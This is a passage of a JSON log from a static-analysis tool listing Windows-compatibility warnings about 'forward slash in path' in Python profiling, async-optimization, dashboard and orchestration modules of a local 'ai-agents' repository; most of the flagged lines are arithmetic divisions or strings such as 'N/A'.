        "warning": "Line 799: Forward slash in path - ')\n        memory_improvement = original_memory / max(1, optimized_memory)\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.310570"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 1: Forward slash in path - \"\nAsync Performance Optimizer for Phase 7 - High-Performance Async Operations\nOptimizes async/await patterns, connection pooling, and concurrent processing\n\"",
        "timestamp": "2025-09-05T17:30:42.311282"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 27: Forward slash in path - \"\n    total_tasks: int = 0\n    completed_tasks: int = 0\n    failed_tasks: int = 0\n    avg_execution_time: float = 0.0\n    max_concurrent_tasks: int = 0\n    current_concurrent_tasks: int = 0\n    connection_pool_usage: Dict[str, int] = field(default_factory=dict)\n    queue_sizes: Dict[str, int] = field(default_factory=dict)\n    \n    @property\n    def success_rate(self) -> float:\n        if self.total_tasks == 0:\n            return 0.0\n        return (self.completed_tasks / self.total_tasks) * 100.0\n\n\n@dataclass\nclass ConnectionPoolConfig:\n    \"",
        "timestamp": "2025-09-05T17:30:42.311322"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 119: Forward slash in path - 'Phase7-AsyncOptimizer/1.0'",
        "timestamp": "2025-09-05T17:30:42.311388"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 198: Forward slash in path - \")\n                raise\n                \n            finally:\n                execution_time = time.perf_counter() - start_time\n                self.execution_times.append(execution_time)\n                \n                # Update average execution time\n                if self.execution_times:\n                    self.metrics.avg_execution_time = sum(self.execution_times) / len(self.execution_times)\n                \n                self.metrics.current_concurrent_tasks -= 1\n                self.metrics.total_tasks += 1\n                \n                if task_id and task_id in self.active_tasks:\n                    del self.active_tasks[task_id]\n    \n    async def batch_execute(self, \n                          coroutines: List[Coroutine], \n                          batch_size: int = 50,\n                          delay_between_batches: float = 0.1,\n                          group_id: Optional[str] = None) -> List[Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.311490"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 220: Forward slash in path - \"\n        \n        results = []\n        total_batches = (len(coroutines) + batch_size - 1) // batch_size\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.311508"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 229: Forward slash in path - \"batch_{i//batch_size + 1}\"",
        "timestamp": "2025-09-05T17:30:42.311527"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 245: Forward slash in path - \"Completed batch {i//batch_size + 1}/{total_batches}\"",
        "timestamp": "2025-09-05T17:30:42.311554"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 263: Forward slash in path - \"\n        \n        semaphore = asyncio.Semaphore(max_concurrent)\n        \n        async def limited_func(item):\n            async with semaphore:\n                if asyncio.iscoroutinefunction(func):\n                    return await func(item)\n                elif use_process_pool:\n                    # Use process pool for CPU-intensive tasks\n                    loop = asyncio.get_event_loop()\n                    return await loop.run_in_executor(self.process_pool, func, item)\n                else:\n                    # Use thread pool for I/O-bound tasks\n                    loop = asyncio.get_event_loop()\n                    return await loop.run_in_executor(self.thread_pool, func, item)\n        \n        tasks = [limited_func(item) for item in items]\n        return await asyncio.gather(*tasks, return_exceptions=True)\n    \n    async def rate_limited_execute(self, \n                                 coro: Coroutine, \n                                 operation_id: str,\n                                 max_per_second: float = 10.0) -> Any:\n        \"",
        "timestamp": "2025-09-05T17:30:42.311607"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Line 450: Forward slash in path - ': (completed - failed) / max(1, completed) * 100 if completed > 0 else 0\n        }\n    \n    async def cancel_task_group(self, group_id: str) -> int:\n        \"",
        "timestamp": "2025-09-05T17:30:42.311760"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 210: Forward slash in path - ')\n        \n        results = []\n        \n        # Extract top functions by cumulative time\n        for func_info, (call_count, reccall_count, total_time_func, cum_time) in stats.stats.items():\n            filename, line_number, func_name = func_info\n            \n            if total_time > 0:\n                percentage = (cum_time / total_time) * 100\n                time_per_call = cum_time / call_count if call_count > 0 else 0\n                \n                # Calculate hotspot score\n                hotspot_score = self._calculate_hotspot_score(\n                    percentage, call_count, time_per_call, cum_time\n                )\n                \n                result = ProfileResult(\n                    session_id=session_id,\n                    function_name=func_name,\n                    total_time=total_time_func,\n                    cumulative_time=cum_time,\n                    call_count=call_count,\n                    time_per_call=time_per_call,\n                    percentage_total=percentage,\n                    filename=filename,\n                    line_number=line_number,\n                    hotspot_score=hotspot_score\n                )\n                \n                results.append(result)\n        \n        # Sort by hotspot score and return top performers\n        results.sort(key=lambda x: x.hotspot_score, reverse=True)\n        return results[:50]  # Top 50 functions\n    \n    def _calculate_hotspot_score(self, percentage: float, call_count: int, \n                               time_per_call: float, cum_time: float) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.312915"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 248: Forward slash in path - \"\n        # Weighted combination of factors\n        score = (\n            percentage * 0.4 +           # Time percentage weight\n            min(100, call_count / 10) * 0.2 +  # Call frequency weight (capped)\n            min(100, time_per_call * 1000) * 0.2 +  # Time per call weight\n            min(100, cum_time * 100) * 0.2      # Absolute time weight\n        )\n        return score\n    \n    def identify_hotspots(self, session_id: str, top_n: int = 10) -> List[ProfileResult]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.312947"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 279: Forward slash in path - \"\n            baseline = self.baseline_metrics.get(baseline_key)\n            \n            if baseline:\n                # Calculate regression percentage\n                if baseline.cumulative_time > 0:\n                    regression_pct = (\n                        (result.cumulative_time - baseline.cumulative_time) / \n                        baseline.cumulative_time * 100\n                    )\n                    \n                    if regression_pct > self.regression_threshold:\n                        # Determine severity\n                        if regression_pct > 50:\n                            severity = \"",
        "timestamp": "2025-09-05T17:30:42.312990"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 299: Forward slash in path - \"\n                        \n                        # Calculate call count change\n                        call_count_change = (\n                            (result.call_count - baseline.call_count) / \n                            max(1, baseline.call_count) * 100\n                        )\n                        \n                        regression = PerformanceRegression(\n                            function_name=result.function_name,\n                            baseline_time=baseline.cumulative_time,\n                            current_time=result.cumulative_time,\n                            regression_percentage=regression_pct,\n                            severity=severity,\n                            detected_at=datetime.now(),\n                            call_count_change=call_count_change\n                        )\n                        \n                        regressions.append(regression)\n        \n        # Store regressions\n        self.regressions.extend(regressions)\n        \n        if regressions:\n            logger.warning(f\"",
        "timestamp": "2025-09-05T17:30:42.313035"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 338: Forward slash in path - \"\n        results = self.profile_results.get(session_id, [])\n        hotspots = self.identify_hotspots(session_id)\n        regressions = self.detect_regressions(session_id)\n        \n        # Calculate summary statistics\n        if results:\n            total_functions = len(results)\n            avg_time_per_call = sum(r.time_per_call for r in results) / total_functions\n            total_calls = sum(r.call_count for r in results)\n            total_time = sum(r.total_time for r in results)\n        else:\n            total_functions = avg_time_per_call = total_calls = total_time = 0\n        \n        # System metrics summary\n        cpu_avg = 0.0\n        memory_avg = 0.0\n        if self.cpu_samples:\n            cpu_avg = sum(sample[1] for sample in self.cpu_samples[-60:]) / min(60, len(self.cpu_samples))\n        if self.memory_samples:\n            memory_avg = sum(sample[1] for sample in self.memory_samples[-60:]) / min(60, len(self.memory_samples))\n        \n        report = {\n            '",
        "timestamp": "2025-09-05T17:30:42.313080"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 386: Forward slash in path - \"\n        \n        profile_path = self.profile_dir / filename\n        \n        if session_id in self.active_profiles:\n            # Save binary profile for external analysis\n            self.active_profiles[session_id].dump_stats(str(profile_path))\n            \n            # Save JSON report\n            report = self.generate_report(session_id)\n            json_path = profile_path.with_suffix('",
        "timestamp": "2025-09-05T17:30:42.313132"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 437: Forward slash in path - \"\n            function_stats[key].append(result)\n        \n        problematic_functions = []\n        for func_key, results in function_stats.items():\n            avg_time = sum(r.cumulative_time for r in results) / len(results)\n            avg_calls = sum(r.call_count for r in results) / len(results)\n            avg_hotspot_score = sum(r.hotspot_score for r in results) / len(results)\n            \n            problematic_functions.append({\n                '",
        "timestamp": "2025-09-05T17:30:42.313196"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Line 469: Forward slash in path - \"\n        cutoff_date = datetime.now() - timedelta(days=days_to_keep)\n        \n        # Clean up CPU/memory samples\n        self.cpu_samples = [\n            sample for sample in self.cpu_samples \n            if sample[0] > cutoff_date\n        ]\n        self.memory_samples = [\n            sample for sample in self.memory_samples \n            if sample[0] > cutoff_date\n        ]\n        \n        # Clean up old regressions\n        self.regressions = [\n            regression for regression in self.regressions\n            if regression.detected_at > cutoff_date\n        ]\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.313256"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 42: Forward slash in path - ': self.total_memory // (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.313619"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 43: Forward slash in path - ': self.available_memory // (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.313631"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 45: Forward slash in path - ': self.process_memory // (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.313640"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 46: Forward slash in path - ': self.tracemalloc_current // (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.313648"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 47: Forward slash in path - ': self.tracemalloc_peak // (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.313656"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 68: Forward slash in path - \"{self.growth_rate:.2f} objects/sec\"",
        "timestamp": "2025-09-05T17:30:42.313677"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 81: Forward slash in path - \"\n    \n    def __init__(self, \n                 tracking_enabled: bool = True,\n                 snapshot_interval: float = 60.0,  # seconds\n                 leak_detection_threshold: float = 100.0,  # objects per minute\n                 max_snapshots: int = 1000):\n        \n        self.tracking_enabled = tracking_enabled\n        self.snapshot_interval = snapshot_interval\n        self.leak_detection_threshold = leak_detection_threshold / 60.0  # Convert to per second\n        self.max_snapshots = max_snapshots\n        \n        # Memory tracking data\n        self.snapshots: deque = deque(maxlen=max_snapshots)\n        self.baseline_snapshot: Optional[MemorySnapshot] = None\n        self.detected_leaks: List[MemoryLeak] = []\n        \n        # Object tracking\n        self.object_trackers: Dict[str, deque] = defaultdict(lambda: deque(maxlen=100))\n        self.allocation_trackers: Dict[str, List[Tuple[datetime, int]]] = defaultdict(list)\n        \n        # Monitoring thread\n        self.monitoring_active = False\n        self.monitor_thread: Optional[threading.Thread] = None\n        \n        # Tracemalloc initialization\n        if tracking_enabled:\n            if not tracemalloc.is_tracing():\n                tracemalloc.start(25)  # Keep 25 frames for detailed traces\n                logger.info(\"",
        "timestamp": "2025-09-05T17:30:42.313725"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 233: Forward slash in path - ': stat.size / (1024 * 1024),\n                    '",
        "timestamp": "2025-09-05T17:30:42.313829"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 261: Forward slash in path - \"\n        if len(self.snapshots) < 3:\n            return  # Need at least 3 snapshots for trend analysis\n        \n        recent_snapshots = list(self.snapshots)[-10:]  # Analyze last 10 snapshots\n        \n        # Track object count changes\n        object_growth = defaultdict(list)\n        \n        for i in range(1, len(recent_snapshots)):\n            prev_snapshot = recent_snapshots[i-1]\n            current_snapshot = recent_snapshots[i]\n            \n            time_diff = (current_snapshot.timestamp - prev_snapshot.timestamp).total_seconds()\n            \n            for obj_type, current_count in current_snapshot.object_counts.items():\n                prev_count = prev_snapshot.object_counts.get(obj_type, 0)\n                growth = (current_count - prev_count) / max(1, time_diff)  # Growth per second\n                object_growth[obj_type].append(growth)\n        \n        # Detect consistent growth patterns\n        current_time = datetime.now()\n        \n        for obj_type, growth_rates in object_growth.items():\n            if len(growth_rates) < 3:\n                continue\n            \n            avg_growth = sum(growth_rates) / len(growth_rates)\n            \n            # Check if growth exceeds threshold and is consistent\n            if avg_growth > self.leak_detection_threshold:\n                # Check if this leak is already detected\n                existing_leak = next(\n                    (leak for leak in self.detected_leaks if leak.object_type == obj_type),\n                    None\n                )\n                \n                if not existing_leak:\n                    # Determine severity\n                    if avg_growth > self.leak_detection_threshold * 10:\n                        severity = \"",
        "timestamp": "2025-09-05T17:30:42.313900"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 325: Forward slash in path - \"Memory leak detected: {obj_type} growing at {avg_growth:.2f} objects/sec\"",
        "timestamp": "2025-09-05T17:30:42.313942"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 341: Forward slash in path - ': 400\n        }\n        \n        estimated_size = size_estimates.get(obj_type, 100)  # Default 100 bytes\n        total_bytes = estimated_size * count\n        return total_bytes / (1024 * 1024)  # Convert to MB\n    \n    def _get_allocation_stack_trace(self, obj_type: str) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.313974"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 386: Forward slash in path - \"reclaimed {memory_freed / (1024*1024):.2f} MB\"",
        "timestamp": "2025-09-05T17:30:42.314036"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 414: Forward slash in path - \"Process memory: {memory_diff / (1024*1024):+.2f} MB, \"",
        "timestamp": "2025-09-05T17:30:42.314075"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 415: Forward slash in path - \"Tracemalloc: {tracemalloc_diff / (1024*1024):+.2f} MB, \"",
        "timestamp": "2025-09-05T17:30:42.314096"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 445: Forward slash in path - '}\n        \n        first_snapshot = relevant_snapshots[0]\n        last_snapshot = relevant_snapshots[-1]\n        \n        time_diff = (last_snapshot.timestamp - first_snapshot.timestamp).total_seconds()\n        \n        # Calculate growth rates\n        memory_growth = last_snapshot.process_memory - first_snapshot.process_memory\n        memory_growth_rate = memory_growth / time_diff  # bytes per second\n        \n        tracemalloc_growth = last_snapshot.tracemalloc_current - first_snapshot.tracemalloc_current\n        tracemalloc_growth_rate = tracemalloc_growth / time_diff\n        \n        # Object count changes\n        object_changes = {}\n        for obj_type, last_count in last_snapshot.object_counts.items():\n            first_count = first_snapshot.object_counts.get(obj_type, 0)\n            change = last_count - first_count\n            change_rate = change / time_diff\n            \n            if abs(change) > 10:  # Only report significant changes\n                object_changes[obj_type] = {\n                    '",
        "timestamp": "2025-09-05T17:30:42.314156"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 469: Forward slash in path - \"{change_rate:.2f} objects/sec\"",
        "timestamp": "2025-09-05T17:30:42.314177"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 473: Forward slash in path - ': time_window.total_seconds() / 60,\n            '",
        "timestamp": "2025-09-05T17:30:42.314200"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 475: Forward slash in path - ': memory_growth / (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.314223"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 476: Forward slash in path - ': memory_growth_rate / (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.314244"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 477: Forward slash in path - ': tracemalloc_growth / (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.314266"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 478: Forward slash in path - ': tracemalloc_growth_rate / (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.314288"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 481: Forward slash in path - ': last_snapshot.process_memory / (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.314313"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 488: Forward slash in path - '}\n        \n        latest_snapshot = self.snapshots[-1]\n        \n        # Calculate trends if we have baseline\n        trends = {}\n        if self.baseline_snapshot:\n            time_diff = (latest_snapshot.timestamp - self.baseline_snapshot.timestamp).total_seconds()\n            memory_change = latest_snapshot.process_memory - self.baseline_snapshot.process_memory\n            memory_trend = memory_change / max(1, time_diff)  # bytes per second\n            \n            trends = {\n                '",
        "timestamp": "2025-09-05T17:30:42.314349"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 500: Forward slash in path - ': memory_change / (1024 * 1024),\n                '",
        "timestamp": "2025-09-05T17:30:42.314371"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 501: Forward slash in path - ': memory_trend / (1024 * 1024),\n                '",
        "timestamp": "2025-09-05T17:30:42.314394"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\memory_profiler.py",
        "warning": "Line 502: Forward slash in path - ': time_diff / 60\n            }\n        \n        # Memory leak summary\n        leak_summary = {\n            '",
        "timestamp": "2025-09-05T17:30:42.314418"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 232: Forward slash in path - '/'",
        "timestamp": "2025-09-05T17:30:42.315022"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 244: Forward slash in path - ': memory.total / (1024**3),\n                '",
        "timestamp": "2025-09-05T17:30:42.315045"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 245: Forward slash in path - ': memory.available / (1024**3),\n                '",
        "timestamp": "2025-09-05T17:30:42.315059"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 247: Forward slash in path - ': disk.total / (1024**3),\n                '",
        "timestamp": "2025-09-05T17:30:42.315074"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 248: Forward slash in path - ': disk.free / (1024**3),\n                '",
        "timestamp": "2025-09-05T17:30:42.315087"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 249: Forward slash in path - ': (disk.used / disk.total) * 100,\n                '",
        "timestamp": "2025-09-05T17:30:42.315102"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 252: Forward slash in path - ': process_memory.rss / (1024**2),\n                '",
        "timestamp": "2025-09-05T17:30:42.315118"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 397: Forward slash in path - 'Low performance score: {metrics.performance_score:.1f}/100'",
        "timestamp": "2025-09-05T17:30:42.315267"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 428: Forward slash in path - \"Performance Score: {metrics.performance_score:.1f}/100 | \"",
        "timestamp": "2025-09-05T17:30:42.315310"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 467: Forward slash in path - ', 0) for m in metrics_list]\n        \n        def calculate_trend(values):\n            if len(values) < 2:\n                return 0\n            return (values[-1] - values[0]) / len(values)\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.315371"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 478: Forward slash in path - ': (timestamps[-1] - timestamps[0]).total_seconds() / 60\n        }\n    \n    def _get_uptime_minutes(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.315398"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 482: Forward slash in path - \"\n        if not self.metrics_history:\n            return 0\n        \n        first_metric = self.metrics_history[0]\n        current_time = datetime.now()\n        uptime = (current_time - first_metric.timestamp).total_seconds() / 60\n        return round(uptime, 1)\n    \n    def export_metrics(self, filepath: str, format: str = '",
        "timestamp": "2025-09-05T17:30:42.315425"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 543: Forward slash in path - ': sum(values) / len(values)\n            }\n        \n        # Count alerts by severity\n        alert_counts = defaultdict(int)\n        for alert in self.alert_history:\n            if alert['",
        "timestamp": "2025-09-05T17:30:42.315496"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 556: Forward slash in path - ': time_window.total_seconds() / 60,\n                '",
        "timestamp": "2025-09-05T17:30:42.315526"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 583: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.315575"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Line 584: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.315601"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Line 472: Forward slash in path - \"\n        \n        healthy_count = sum(\n            1 for health in self._service_health.values()\n            if health.status == HealthStatus.HEALTHY\n        )\n        \n        total_services = len(self._service_health)\n        health_ratio = healthy_count / total_services\n        \n        if health_ratio >= 0.9:\n            return \"",
        "timestamp": "2025-09-05T17:30:42.316609"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\orchestration_service.py",
        "warning": "Line 502: Forward slash in path - \"] * (n - 1) + execution_time) / n\n        )\n        \n        # Update success rate\n        metrics[\"",
        "timestamp": "2025-09-05T17:30:42.317569"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\orchestration_service.py",
        "warning": "Line 506: Forward slash in path - \"] / metrics[\"",
        "timestamp": "2025-09-05T17:30:42.317588"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\orchestration_service.py",
        "warning": "Line 512: Forward slash in path - \")))) < timedelta(hours=1)\n        ]\n        \n        if not recent_executions:\n            return 0.0\n        \n        successful = sum(1 for result in recent_executions if result.overall_success)\n        return successful / len(recent_executions)\n    \n    async def get_execution_history(self, limit: int = 100) -> List[OrchestrationResult]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.317610"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
        "warning": "Line 35: Forward slash in path - 'data/'",
        "timestamp": "2025-09-05T17:30:42.320060"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
